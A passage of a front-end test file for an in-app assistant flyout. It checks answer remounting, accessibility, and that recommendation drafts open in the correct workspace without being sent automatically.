    expect(flyout.querySelector("img")).toBeNull();
  });

  // Only the thread on screen is mounted, so coming back to a workspace
  // remounts every answer in it. One that already finished its reveal paints
  // whole on the way back instead of typing itself out again.
  it("paints an answer already revealed whole when the person comes back to its workspace", async () => {
    const { user, renavigate } = await openFlyout();
    await ask(user, "what is live?");
    await findAnswerText("Three runs are live.");
    await waitFor(() => {
      expect(screen.queryByTestId("assistant-answer-announced")).toBeNull();
    });

    renavigate("/acme/payments");
    renavigate("/acme/core-platform");

    expect(screen.getByTestId("assistant-answer")).toHaveTextContent(
      "Three runs are live.",
    );
    expect(screen.queryByTestId("assistant-answer-announced")).toBeNull();
  });

  it("has no axe violations", async () => {
    const { flyout } = await openFlyout();
    await expectNoAxe(flyout);
  });
});

describe("cost recommendation handoff", () => {
  it("opens a closed composer without sending the draft", () => {
    render(tree());
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute(
      "data-state",
      "closed",
    );
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute("inert");
    act(() => {
      openAssistantDraft({
        org: "acme",
        ws: "core-platform",
        content: "Review this code correction.",
      });
    });
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute(
      "data-state",
      "open",
    );
    expect(screen.getByTestId("assistant-flyout")).not.toHaveAttribute("inert");
    expect(screen.getByTestId("assistant-composer")).toHaveValue(
      "Review this code correction.",
    );
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("ignores a matching workspace slug in another organization", async () => {
    await openFlyout();
    act(() => {
      openAssistantDraft({
        org: "other",
        ws: "core-platform",
        content: "Private recommendation.",
      });
    });
    expect(screen.getByTestId("assistant-composer")).toHaveValue("");
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("keeps drafts in their own workspace after navigation", async () => {
    const { renavigate } = await openFlyout();
    act(() => {
      openAssistantDraft({
        org: "acme",
        ws: "core-platform",
        content: "Core recommendation.",
      });
    });
    renavigate("/acme/payments");
    act(() => {
      openAssistantDraft({
        org: "acme",
        ws: "core-platform",
        content: "Late core recommendation.",
      });
    });
    expect(screen.getByTestId("assistant-composer")).toHaveValue("");
    renavigate("/acme/core-platform");
    expect(screen.getByTestId("assistant-composer")).toHaveValue(
      "Core recommendation.",
    );
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("opens a reviewable draft, preserves unsent work, and sends nothing", async () => {
    const { user } = await openFlyout();
    await user.type(
      screen.getByTestId("assistant-composer"),
      "My existing question.",
    );
    act(() => {
      openAssistantDraft({
        org: "acme",
        ws: "core-platform",
        content: "Plan a code PR for repeated reads.",
      });
    });
    expect(screen.getByTestId("assistant-composer")).toHaveValue(
      "My existing question.\n\nPlan a code PR for repeated reads.",
    );
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("ignores a request belonging to a different workspace", async () => {
    await openFlyout();
    act(() => {
      openAssistantDraft({
        org: "acme",
        ws: "other",
        content: "Plan a code PR.",
      });
    });
    expect(screen.getByTestId("assistant-composer")).toHaveValue("");
    expect(askAssistant).not.toHaveBeenCalled();
  });
});

it("preserves an existing draft when a recommendation would exceed the message limit", async () => {
  await openFlyout();
  const existing = "x".repeat(32_760);
  fireEvent.change(screen.getByTestId("assistant-composer"), {
    target: { value: existing },
  });
  act(() => {
    openAssistantDraft({
      org: "acme",
      ws: "core-platform",
      content: "Plan a code PR for this finding.",
    });
  });
  expect(screen.getByTestId("assistant-composer")).toHaveValue(existing);
  expect(screen.getByRole("alert")).toHaveTextContent(
    "Your existing draft is unchanged",
  );
  expect(askAssistant).not.toHaveBeenCalled();
});
